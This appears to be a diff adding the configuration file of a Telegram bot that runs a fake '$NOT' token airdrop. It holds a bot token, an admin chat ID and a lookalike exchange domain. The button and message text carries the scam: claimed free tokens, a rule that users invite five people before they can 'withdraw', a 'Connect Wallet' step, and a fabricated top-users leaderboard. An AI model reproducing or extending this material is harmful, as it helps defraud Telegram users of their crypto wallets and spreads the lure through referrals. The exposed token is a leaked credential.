@@ -1,0 +1,28 @@
+{
+    "bot_token": "6885889962:AAHHGz-UNbQfiVTTtNGOnX7tzB9gLr2Dvew",
+    "domain_url": "https://hamsterexchange.cc",
+    "send_logs": true,
+    "chat_id_logs": 7494635164,
+    "admin_id": 7494635164,
+    "keyboard": {
+        "claimnote_button": "🎁 Claim 20,000 $NOT",
+        "referalsystem_button": "👥 Referal system",
+        "topuser_button": "👑 Top Users",
+        "connectwallet_button": "📥 Connect Wallet",
+        "web_app_text_1": "🕹 Let's start",
+        "claimnotcoin_button": "🕹 Withdraw to wallet!",
+        "web_app": "🎁 GET AIRDROP"
+    },
+    "lang": {
+        "top_users_lang": "🥇@moriseen\n 👥Referrals invited: 1.436 fren's\n 💵Balance: 4,308,000 $NOT\n\n 🥈 @SuediS\n 👥Referrals invited: 1.275 fren's\n 💵Balance: 3,445,000 $NOT\n\n 🥉 @oOoOoo0Oo0Oo0\n 👥Referrals invited: 1.249 fren's\n 💵Balance: 3,257,000 $NOT\n ----------------------------\n 1.643.554. @{0}\n 👥Referrals invited: 0 fren's\n 💵Balance: 20.000 $NOT",
+        "referal_system_lang": "👥 Hi, {0} , your refferal link\n❗️ Don't forget to invite 5 people to withdraw tokens.\n\nYour referral link: https://t.me/{1}?start={2}\n\n\nSend this link to a friend to get $NOT.\n\nFor each friens, you get 1,000 $NOT. \nFor friens with a Telegram Premium subscription, you get 10,000 $NOT.\n",
+        "claimnote_text": "🎉 Success! 20,000 $NOT already on your balance in the bot !",
+        "connectwallet_lang": "<b>Click on the button</b>"
+    },
+    "photos": {
+        "getnotcoin": "./photos/getnotcoin.jpg",
+        "referal": "./photos/referal.jpg",
+        "main": "./photos/main.jpg"
+    }
+
+}
